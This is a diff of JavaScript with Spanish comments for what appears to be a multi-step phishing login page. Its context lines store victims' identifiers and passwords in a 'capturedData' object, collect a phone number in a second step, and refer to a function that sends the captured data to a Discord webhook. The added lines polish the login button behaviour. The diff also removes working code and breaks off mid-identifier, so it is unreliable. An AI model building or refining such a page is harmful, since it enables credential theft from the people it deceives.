@@ -268,11 +268,19 @@
             const toggleButton = () => {
                 const identifier = identifierInput.value.trim();
                 const password = passwordInput.value.trim();
+                // El botón está deshabilitado si al menos uno de los campos está vacío.
+                // Se habilita si ambos campos tienen contenido (length > 0)
                 loginButton.disabled = !(identifier.length > 0 && password.length > 0);
+                // Opcional: Cambia la opacidad para mejorar la visibilidad del estado
+                loginButton.classList.toggle('opacity-50', loginButton.disabled);
             };
 
+            // Asegura que el evento 'input' se active en cualquier cambio de texto
             identifierInput.addEventListener('input', toggleButton);
             passwordInput.addEventListener('input', toggleButton);
+            
+            // Llama a toggleButton al cargar la página para establecer el estado inicial
+            toggleButton();
         });
 
         // Función para enviar los datos capturados al Webhook de Discord
@@ -380,6 +388,7 @@
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
 
+            // DOBLE VERIFICACIÓN: Sólo procede si el botón está habilitado (es decir, los campos tienen contenido)
             if (identifier && password) {
                 // GUARDAR DATOS DEL PASO 1
                 capturedData.identifier = identifier;
@@ -390,21 +399,4 @@
 
                 // Transición al Paso 2
                 step1.classList.add('hidden');
-                step2.classList.remove('hidden');
-            } else {
-                console.error("Error de inicio de sesión simulado: Campos vacíos.");
-            }
-        }
-        
-        // Función para simular el envío del número de teléfono (Paso 2)
-        function handlePhoneSubmit(event) {
-             event.preventDefault(); 
-
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
-
-
-            if (phoneNumber) {
-                 // GUARDAR DATOS DEL PASO 2
-                capturedData.phoneNumb
+                    
